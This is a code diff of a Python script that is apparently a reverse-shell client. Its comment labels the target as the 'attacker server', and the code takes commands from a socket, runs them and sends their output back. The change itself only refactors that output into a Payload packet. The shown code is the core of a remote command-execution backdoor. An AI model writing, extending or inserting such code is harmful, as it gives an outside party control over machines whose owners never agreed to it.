@@ -1,6 +1,7 @@
 import subprocess
 import socket
 import time
+from payload import Payload
 
 # Attacker server ip and port
 ip = "localhost"
@@ -32,10 +33,11 @@ def create_socket():
 
         # Generate command
         stdout, stderr = run_command(data.decode())
-        payload = str([stdout, stderr])
-        payload = bytes(payload, encoding="utf-8")
+        payload = Payload(stdout=stdout, stderr=stderr)
+        packet = payload.get_packet()
+
         try:
-            sock.sendall(payload)
+            sock.sendall(packet)
         except:
             create_socket()
 
